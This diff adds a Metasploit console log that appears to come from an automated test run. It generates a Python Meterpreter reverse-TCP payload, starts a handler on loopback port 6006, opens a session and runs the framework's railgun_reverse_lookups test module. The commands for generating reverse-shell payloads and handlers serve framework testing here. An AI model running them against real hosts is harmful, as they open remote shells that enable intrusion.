@@ -1,0 +1,28 @@
+use python/meterpreter_reverse_tcp
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/tmp/pythonmeterpreter_reverse_tcp_session_tlv_logging20231026-3250-oue4zhtxt
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> generate -o /tmp/child-process-rb-python-meterpreter-reverse-tcp20231026-3250-yfhwva.py -f raw AutoVerifySessionTimeout=30 lport=6006 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/pythonmeterpreter_reverse_tcp_debug_log20231026-3250-oteutttxt MeterpreterTryToFork=false PythonMeterpreterDebug=true
+SessionTlvLogging => file:/tmp/pythonmeterpreter_reverse_tcp_session_tlv_logging20231026-3250-oue4zhtxt
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> [*] Writing 24916 bytes to /tmp/child-process-rb-python-meterpreter-reverse-tcp20231026-3250-yfhwva.py...
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 5
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6006 
+[*] Meterpreter session 7 opened (127.0.0.1:6006 -> 127.0.0.1:57304) at 2023-10-26 19:04:16 +0000
+use test/railgun_reverse_lookups
+[4mmsf6[0m post([1m[31mtest/railgun_reverse_lookups[0m) [0m> run session=7 AddEntropy=true Verbose=true
+[*] Running against session 7
+[*] Session type is meterpreter and platform is linux
+[*] SKIPPED: def test_osx_static (session platform is not osx)
+[+] should return a constant name given a const and a filter
+[*] SKIPPED: def test_windows_static (session platform is not windows)
+[*] SKIPPED: def test_windows_datastore (session platform is not windows)
+[*] Testing complete in 0.0 seconds
+[*] Passed: 4; Failed: 0; Skipped: 3
+[*] Post module execution completed
+sessions -K
+[4mmsf6[0m post([1m[31mtest/railgun_reverse_lookups[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 7 closed.
+[4mmsf6[0m post([1m[31mtest/railgun_reverse_lookups[0m) [0m> 
